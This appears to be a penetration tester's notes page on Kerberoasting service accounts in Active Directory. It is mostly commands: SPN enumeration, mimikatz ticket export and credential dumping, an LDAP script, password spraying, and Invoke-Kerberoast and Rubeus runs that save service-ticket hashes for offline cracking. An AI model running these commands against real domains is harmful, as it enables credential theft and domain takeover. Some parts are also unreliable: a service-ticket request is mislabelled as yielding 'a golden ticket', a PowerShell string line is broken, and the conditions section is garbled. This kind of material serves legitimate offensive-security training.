# ServicePrincipalName (SPN)

## 01 - Manual

## 1.1 - Conditions

When SPN service accounts like SQLService, iis_svc, MSSQL_SVC, etc. With two of the following conditions in order to achieve this:

1. It must be part of the **"Domain Admins"** group member.
2. Has **weak passwords** when the **Kerberos 5, etype 23, TGS-REP** hash type is crackable due to those reasons (refer to [[JTR#^0c9a3c|JTR]] or [[Hashcat#^87baa5|Hashcat]] section **under Offline Password Cracking**).

## 1.2 - Enumeration

TODO: Probably the mimikatz commands needs to be arranged somewhere

### 1.2.1 - Command Prompt

`C:\> setspn -t <domain_name> -q */*`

`C:\> setspn -t <domain_name> -q */* | findstr SQL`

`mimikatz # kerberos::list /export`

`mimikatz # sekurlsa::logonpasswords`

### 1.2.2 - Powershell

`PS C:\> Add-Type -AssemblyName System.IdentityModel`

`PS C:\> New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList 'HTTP/<FQDN>'`

`PS C:\> klist`

You'll get a golden ticket

`mimikatz # kerberos::list /export`

`$ cat enumerateADpassword.ps1`

---

```powershell
$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()

$PDC = ($domainObj.PdcRoleOwner).Name

$SearchString = "LDAP://"
$SearchString = "$PDC + "/"

$DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))"

$SearchString += $DistinguishedName

New-Object System.DirectoryServices.DirectoryEntry($SearchString, "<username>", "<password>")
```

`PS C:\> .\Spray-Password.ps1 -Pass <password> -Admin`

Right-Click > CTRL + Right-Click > Run as different user

`mimikatz # sekurlsa::logonpasswords`

## 02 - Impacket

Refer to [[Pentesting Phases/Information Gathering/Active Fingerprinting/Enumeration/Kerberos#^e70af7|Active Enumeration]] section for Kerberoasting

## 03 - Invoke-Kerberoast

```
PS C:\> Invoke-Kerberoast -OutputFormat John

PS C:\> Invoke-Kerberoast -OutputFormat John | fl | Out-File -FilePath C:\path\to\hashes.txt -Append -Force -Encoding UTF8

PS C:\> Invoke-Kerberoast -OutputFormat HashCat

PS C:\> Invoke-Kerberoast -OutputFormat HashCat | fl | Out-File -FilePath C:\path\to\hashes.txt -Append -Force -Encoding UTF8
```

## 04 - Rubeus

TODO: Provide more example use cases

`C:\> Rubeus.exe kerberoast [/simple] /nowrap`

## References

- [PentestLab SPN Discovery](https://pentestlab.blog/2018/06/04/spn-discovery/)

- [PentestLab Kerberoast](https://pentestlab.blog/2018/06/12/kerberoast/)

- [BC-Security Empire Invoke-Kerberoast Module](https://github.com/BC-SECURITY/Empire/blob/main/empire/server/data/module_source/credentials/Invoke-Kerberoast.ps1)

- [Active Directory Kerberos Abuse Child Domain Domain Admin to Enterprise Admin In Parent Domain](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)

- [Active Directory Kerberos Abuse T1208-Kerberoasting](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1208-kerberoasting)

- [Deep Dive Into Kerberoasting Attack](https://www.hackingarticles.in/deep-dive-into-kerberoasting-attack/)

- [Kerberoasting Simplified Attack and Defense](https://blog.certcube.com/kerberoasting-simplified-attack-and-defense/)

- [Tothi KrbRelay Privilege Escalation How-To](https://gist.github.com/tothi/bf6c59d6de5d0c9710f23dae5750c4b9)

- [Active Directory Security Risk #101: Kerberos Unconstrained Delegation (or How Compromise of a Single Server Can Compromise the Domain)](https://adsecurity.org/?p=1667)

- [XPNSec: Kerberos AD Attacks - Kerberoasting](https://blog.xpnsec.com/kerberos-attacks-part-1/)